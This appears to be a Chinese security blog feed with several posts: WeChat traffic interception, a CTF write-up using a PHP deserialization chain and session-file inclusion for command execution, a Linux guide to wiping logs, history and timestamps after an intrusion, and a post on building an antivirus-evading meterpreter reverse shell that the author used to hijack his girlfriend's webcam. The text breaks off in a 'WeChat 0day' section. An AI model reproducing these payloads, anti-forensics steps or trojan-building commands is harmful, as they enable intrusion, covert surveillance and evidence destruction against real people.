        <content type="html"><![CDATA[<p>总结以下微信的数据包抓取，免得忘记了。主要是针对微信PC端的小程序，以及微信PC的公众号抓取。利用了burp + proxifier + fiddler,xray 在开启被动扫描，burp流量转发至burp，自动扫描。</p><a id="more"></a><h1 id="微信小程序数据包抓取"><a href="#微信小程序数据包抓取" class="headerlink" title="微信小程序数据包抓取"></a>微信小程序数据包抓取</h1><p>整体思路：1、利用proxifier抓取微信小程序exe，流量转发至burp</p><p><img src="/WeChatApp.jpg" alt="WeChatApp"></p><p>proxifier配置Servers，设置127.0.0.1:8080的https和http</p><p><img src="/proxifierServers.jpg" alt="proxifierServers配置"></p><p>proxifier配置Rules将wechatapp.exe; wechatapplauncher.exe进行监听，基本上只会用到wechatapp，我看另一个也是app所以一起监听了，以防万一</p><p><img src="/proxifierRules.jpg" alt="proxifierRules"></p><p>打开去哪儿，发现数据包抓取成功，proxifier将数据抓取</p><p><img src="/wechatpro.jpg" alt="wechatapp数据包抓取"></p><p>proxifier将数据传至burp获取数据包，成功抓取小程序数据。</p><p><img src="/wechatburp.jpg" alt="wechatburp数据包抓取.jpg"></p><h1 id="微信公众号数据包抓取"><a href="#微信公众号数据包抓取" class="headerlink" title="微信公众号数据包抓取"></a>微信公众号数据包抓取</h1><p>配置Fiddler web，配置8888端口，再配置gateway配置代理：127.0.0.1:8080</p><p><img src="/Fiddler.jpg" alt="Fiddler配置"></p><p>成功配置后点击show current gateway info,测试是否相通</p><p><img src="/Fiddlergateway.jpg" alt="Fiddlergateway"></p><p>burp成功获得数据包</p><p><img src="/burpfiddler.jpg" alt="burp数据"></p><h1 id="xray配置扫描"><a href="#xray配置扫描" class="headerlink" title="xray配置扫描"></a>xray配置扫描</h1><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_windows_amd64.exe webscan --listen <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8989</span> --html-output test.html</span><br></pre></td></tr></table></figure><p>burp配置上层代理规则，将流量转发至xray进行被动扫描</p><p><img src="/burpxray.jpg" alt="burp配置上层代理"></p>]]></content>
      
      
      <categories>
          
          <category> 数据包抓取 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-祥云杯web</title>
      <link href="/2021/08/23/2021-%E7%A5%A5%E4%BA%91%E6%9D%AFweb/"/>
      <url>/2021/08/23/2021-%E7%A5%A5%E4%BA%91%E6%9D%AFweb/</url>
      
        <content type="html"><![CDATA[<h2 id="部分web，太菜了有些做不出来-ezyii参考：https-xz-aliyun-com-t-9948不过后来第四条链子被作者删了。代码如下："><a href="#部分web，太菜了有些做不出来-ezyii参考：https-xz-aliyun-com-t-9948不过后来第四条链子被作者删了。代码如下：" class="headerlink" title="部分web，太菜了有些做不出来# ezyii参考：https://xz.aliyun.com/t/9948不过后来第四条链子被作者删了。代码如下："></a>部分web，太菜了有些做不出来<br><a id="more"></a><br># ezyii<br>参考：<a href="https://xz.aliyun.com/t/9948" target="_blank" rel="noopener">https://xz.aliyun.com/t/9948</a><br>不过后来第四条链子被作者删了。<br><br>代码如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">protected</span> $output;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $processes = [];</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output=<span class="keyword">new</span> DefaultGenerator(<span class="string">'jiang'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> RunProcess()));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">DefaultGenerator</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $default;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;default = $default;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $streams = [];</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $seekable = <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;streams[]=<span class="keyword">new</span> CachingStream();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $remoteStream;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;remoteStream=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;stream=<span class="keyword">new</span>  PumpStream();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $source;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $size=<span class="number">-10</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">private</span> $buffer;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;buffer=<span class="keyword">new</span> DefaultGenerator(<span class="string">'j'</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>(<span class="string">"closure/autoload.php"</span>);</span></span><br><span class="line"><span class="php">            $a = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;system(<span class="string">'cat /flag.txt'</span>);&#125;;</span></span><br><span class="line"><span class="php">            $a = \Opis\Closure\serialize($a);</span></span><br><span class="line"><span class="php">            $b = unserialize($a);</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;source=$b;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></h2><h1 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h1><pre><code>通过POST请求发现报错，代码中使用file_get_contents，</code></pre><p>第一时间想到了利用伪协议读取，试了好多个，发现不是被禁用了就是不行</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/check2.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eci-2zefzyj8kapkgt0oad3m.cloudeci1.ichunqiu.com</span><br><span class="line"></span><br><span class="line">url1=http://ss123.828.22.1/</span><br></pre></td></tr></table></figure><p>后面进行目录扫描，发现存在admin文件夹，尝试访问admin文件夹，payload：<code>http://127.0.0.1/admin/</code></p><p><img src="/1.png" alt="admin文件夹"></p><p>继续访问include123.php：<code>http://127.0.0.1/admin/include123.php</code></p><p><img src="/2.png" alt="include123.php"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$u=$_GET[<span class="string">'u'</span>];</span><br><span class="line"></span><br><span class="line">$pattern = <span class="string">"\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where"</span>;</span><br><span class="line">$pattern .= <span class="string">"|file_put_content|file_get_content|fwrite|curl|system|eval|assert"</span>;</span><br><span class="line">$pattern .=<span class="string">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span>;</span><br><span class="line">$pattern .=<span class="string">"|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr"</span>;</span><br><span class="line">$pattern .=<span class="string">"|file|dict|gopher"</span>;</span><br><span class="line"><span class="comment">//累了累了，饮茶先</span></span><br><span class="line"></span><br><span class="line">$vpattern = explode(<span class="string">"|"</span>,$pattern);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($vpattern <span class="keyword">as</span> $value)&#123;    </span><br><span class="line">    <span class="keyword">if</span> (preg_match( <span class="string">"/$value/i"</span>, $u ))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"检测到恶意字符"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>($u);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试了好多个都不行，查看了下session文件包含漏洞,应该是这个。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常见的php-session存放位置：</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sessions<span class="regexp">/sess_PHPSESSID</span></span><br></pre></td></tr></table></figure><p><img src="/3.png" alt="PHPSESSID"></p><p>执行下phpinfo成功。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:http:<span class="comment">//127.0.0.1/admin/include123.php?u=/tmp/sess_bedc37fbe5d2e7b064d01cce92e65182&amp;test=<span class="meta">&lt;?</span>=phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;?</span>=<span class="string">"xx"</span><span class="meta">?&gt;</span>为PHP短标签，同等与<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"xxx"</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/4.png" alt="phpinfo()"></p><p>执行lS试试，这边利用了<code>${IFS}</code>代替了空格</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/admin/i</span>nclude123.php?u=<span class="regexp">/tmp/</span>sess_bedc37fbe5d2e7b064d01cce92e65182&amp;test=&lt;?=system(<span class="string">'ls$&#123;IFS&#125;/'</span>);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/5.png" alt="ls${IFS}/"></p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin boot dev etc getflag.sh home <span class="class"><span class="keyword">lib</span> <span class="title">lib64</span> <span class="title">media</span> <span class="title">mnt</span> <span class="title">opt</span> <span class="title">proc</span> <span class="title">root</span> <span class="title">run</span> <span class="title">sbin</span> <span class="title">srv</span> <span class="title">sys</span> <span class="title">tmp</span> <span class="title">usr</span> <span class="title">var</span> <span class="title">var</span></span></span><br></pre></td></tr></table></figure><p>发现根目录下存在getflag.sh，运行下试试，由于flag被过滤，所以这边利用fl?g来代替flag</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/admin/i</span>nclude123.php?u=<span class="regexp">/tmp/</span>sess_bedc37fbe5d2e7b064d01cce92e65182&amp;test=&lt;?=system(<span class="string">'.$&#123;IFS&#125;/getfl?g.sh'</span>);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/6.png" alt="getflag.sh"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#2-SESSION" target="_blank" rel="noopener">一篇文章带你理解漏洞之 PHP 文件包含漏洞</a><br><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">文件包含漏洞</a><br><a href="https://xz.aliyun.com/t/9948" target="_blank" rel="noopener">yii 2.0.42 最新反序列化利用全集</a><br><a href="https://blog.csdn.net/m0_51078229/article/details/119840772" target="_blank" rel="noopener">[祥云杯2021] wp</a></p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux痕迹清理</title>
      <link href="/2021/08/18/Linux%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
      <url>/2021/08/18/Linux%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>在渗透完成之后，为了减少被发现和追溯的概率，攻击者有必要清除自己的攻击痕迹，本文对Linux上清理痕迹的方式做一个总结。（可能不全，只汇总了最多的几种。可能没有做绝）</p><a id="more"></a><h2 id="history清理"><a href="#history清理" class="headerlink" title="history清理"></a>history清理</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~<span class="string">/.bash_history</span></span><br><span class="line"><span class="keyword">history</span> -c</span><br></pre></td></tr></table></figure><h2 id="日志清理"><a href="#日志清理" class="headerlink" title="日志清理"></a>日志清理</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/syslog;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/messages;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/httpd/access_log;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/httpd/error_log;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/xferlog;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/secure;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/auth.<span class="keyword">log</span>;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/user.<span class="keyword">log</span>;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/lastlog;echo &gt; /<span class="keyword">var</span>/<span class="keyword">log</span>/btmp;echo &gt; /<span class="keyword">var</span>/<span class="keyword">run</span>/utmp ;history -c</span><br><span class="line">或</span><br><span class="line">echo | tee /<span class="keyword">var</span>/<span class="keyword">log</span>/syslog /<span class="keyword">var</span>/<span class="keyword">log</span>/messages /<span class="keyword">var</span>/<span class="keyword">log</span>/httpd/access_log /<span class="keyword">var</span>/<span class="keyword">log</span>/httpd/error_log /<span class="keyword">var</span>/<span class="keyword">log</span>/xferlog /<span class="keyword">var</span>/<span class="keyword">log</span>/secure /<span class="keyword">var</span>/<span class="keyword">log</span>/auth.<span class="keyword">log</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/user.<span class="keyword">log</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp /<span class="keyword">var</span>/<span class="keyword">log</span>/lastlog /<span class="keyword">var</span>/<span class="keyword">log</span>/btmp /<span class="keyword">var</span>/<span class="keyword">run</span>/utmp &gt; /dev/null</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure><h2 id="匹配字符更换IP"><a href="#匹配字符更换IP" class="headerlink" title="匹配字符更换IP"></a>匹配字符更换IP</h2><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i "s/<span class="number">132.23.11</span>.x/ <span class="number">192.7.22.12</span>/g" `grep <span class="number">132.23.11</span>.x -rl /var/log`</span><br></pre></td></tr></table></figure><h2 id="修改文件时间"><a href="#修改文件时间" class="headerlink" title="修改文件时间"></a>修改文件时间</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">touch</span> <span class="selector-tag">-r</span> <span class="selector-tag">A</span><span class="selector-class">.php</span> <span class="selector-tag">B</span><span class="selector-class">.php</span>;<span class="selector-tag">history</span> <span class="selector-tag">-c</span></span><br><span class="line">将<span class="selector-tag">B</span>文件改为<span class="selector-tag">A</span>文件时间</span><br><span class="line"><span class="selector-tag">touch</span> <span class="selector-tag">-d</span> "2021<span class="selector-tag">-03-29</span> 14<span class="selector-pseudo">:01</span><span class="selector-pseudo">:22"</span> 1<span class="selector-class">.txt</span>;<span class="selector-tag">history</span> <span class="selector-tag">-c</span></span><br><span class="line">修改文件时间</span><br></pre></td></tr></table></figure><h2 id="删除匹配时间或者其他关键词的行"><a href="#删除匹配时间或者其他关键词的行" class="headerlink" title="删除匹配时间或者其他关键词的行"></a>删除匹配时间或者其他关键词的行</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-16-centos <span class="built_in">log</span>]<span class="comment"># sh delect.sh 2022-06-01</span></span><br><span class="line">delect.sh：</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> `grep <span class="string">"<span class="variable">$1</span>"</span> -rl /var/<span class="built_in">log</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"> tmp=$(sed -e /<span class="variable">$1</span>/d <span class="variable">$f</span>);</span><br><span class="line"> <span class="built_in">printf</span> <span class="string">"%s"</span> <span class="string">"<span class="variable">$tmp</span>"</span> &gt; <span class="variable">$f</span></span><br><span class="line"><span class="keyword">done</span> ;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 痕迹清理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.15提醒朋友注意自身网络安全记录</title>
      <link href="/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/04/19/4-15%E6%8F%90%E9%86%92%E6%9C%8B%E5%8F%8B%E6%B3%A8%E6%84%8F%E8%87%AA%E8%BA%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>那天闲着蛋疼，逛博客的时候发现有一篇教育意义（很狗）的博客，就想着4.15也快到了。趁着这个机会提醒下身边的朋友，在平常网上冲浪的时候注意下网络安全，说不定玩着玩着可能就被不知不觉的直播了。<br>阅读的文章：<a href="https://my.oschina.net/u/4588149/blog/4421821" target="_blank" rel="noopener">一次渗透妹子电脑开摄像头全过程</a></p><a id="more"></a><p>看着特别有意思,不过实践起来一定要注意适当。别干违法的事&#x3D; &#x3D;<br>还是简单描述具体思路好了，详细的如果实现不了私聊</p><h2 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h2><ul><li>第一步<br>构建恶意文件<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.指定一个可执行程序 捆绑木马</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp -e x64/zutto_dekiru LHOST=[IP] <span class="attribute">LPORT</span>=3333 -x webshell.exe -i 12 -f exe -o /root/webshell.exe</span><br><span class="line"></span><br><span class="line">2.联合shellcodeloader免杀制作.bin文件</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] <span class="attribute">LPORT</span>=3333 -e x64/zutto_dekiru -f<span class="built_in"> raw </span>-o windows.bin</span><br><span class="line"></span><br><span class="line">3.生成c文件</span><br><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp -e x64/zutto_dekiru -i 10 lhost=[IP] <span class="attribute">lport</span>=3333 -f c -o ~/windows.c</span><br><span class="line"></span><br><span class="line">4.Cobaltstrike生成宏病毒代码</span><br><span class="line">一键生成宏代码后，新建一个文档或者用已经有的文档构建。（以word为例）步骤如下：</span><br><span class="line">选择 <span class="string">"视图"</span> -&gt; 宏 -&gt; 查看宏 -&gt; 创建，填入生成的宏代码即可</span><br></pre></td></tr></table></figure></li><li>第二步<br>制作免杀，msfvenom生成的恶意文件基本底裤都被研究完了，生成C文件，再<ol><li>加壳免杀（这个比较简单，我会！！）<ul><li>upx加壳 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">sudo apt-<span class="built_in">get</span> install upx</span><br><span class="line">对windows.<span class="keyword">exe</span>进行加壳，生成的windows-upxed.<span class="keyword">exe</span>文件就是加壳后的</span><br><span class="line">sudo upx windows.<span class="keyword">exe</span> -<span class="keyword">o</span> windows-upxed.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure></li><li>shellcodeloader免杀<br><img src="/123213scsadsaxzcadsadsa.jpg" alt="shellcodeloader"><br>生成bin文件后利用shellcodeloader生成免杀文件</li></ul></li><li>生成C文件自己编译,上述命令生成了buf，编译生成exe(最简单的)  <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#inclde&lt;bits/stdc++.h&gt;</span></span><br><span class="line">using namespace std<span class="comment">;</span></span><br><span class="line"><span class="meta">#将生成的windows.c中buf字符串复制到这里</span></span><br><span class="line">unsigned char buf[······]<span class="comment">;</span></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line"> <span class="built_in">int</span> (*<span class="function"><span class="keyword">func</span>)<span class="params">()</span> = <span class="params">(int(*)</span><span class="params">()</span>)<span class="title">buf</span>;</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span><span class="params">()</span>;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li>第三步<br>缕清攻击策略（以我对象为例）  <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 恶意文件捆绑她专业软件破解版发给她（可能会被发现，免杀做的有点粗糙不一定能过）</span><br><span class="line"><span class="number">2.</span> 以八卦的形式（前几天看到项XX瓜，再结合她本身是朝阳区第一吃瓜群众，这个方法可行性最高！但是会报毒，否定）</span><br></pre></td></tr></table></figure></li><li>第四步<br>开始搞看来只能做个恶意程序捆绑正常文件了，先做个垃圾文件。然后更换了图标为网易云的图标。直接冲！<br><img src="/sdae_2sdsa17-55-38.jpg"><br><img src="/20210423212319164859.jpg" alt="上线了~"><br>立马移动到别的pid进程去了，然后利用webcam_stream在公网起了个直播哈哈，不过看了会她发现关掉没用，就关机了，然后开机发现没了就跟我得瑟，同志们我还是下手轻了。<br><img src="/sdasda021-04-19_18-12-55.jpg"><br>后面通过她拍的照片发现摄像头边上的灯还是有点用的，毕竟突然亮起来肯定没好事<del>，不过我有物理遮挡</del><br><img src="/2021012312163906.jpg"><br>到现在我发的文件她都不接收了，除非带着vt截图!!果然一朝被蛇咬十年怕井绳，还是亲身经历过，才了解平常网上冲浪要注意安全！<br><img src="/1232131231wdsada8.jpg"></li></ul><h2 id="MSF权限维持"><a href="#MSF权限维持" class="headerlink" title="MSF权限维持"></a>MSF权限维持</h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ps</span> <span class="string">-列出正在运行的进程</span></span><br><span class="line"><span class="attr">migrate</span> <span class="string">【PID】 -移动到一个指定的 PID 的活动进程</span></span><br></pre></td></tr></table></figure><h2 id="WeChat-0day上线"><a href="#WeChat-0day上线" class="headerlink" title="WeChat 0day上线"></a>WeChat 0day上线</h2><p>当我看到这个漏洞的时候，我知道轮到她以及他们得瑟的时代结束了~<br>首先生成属于自己的shellcode,然后将buf字符串替换<code>\</code>为<code>,0</code>。在服务器上起一个服务，杀穿了~</p><p><img src="/1618843022.jpg"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span 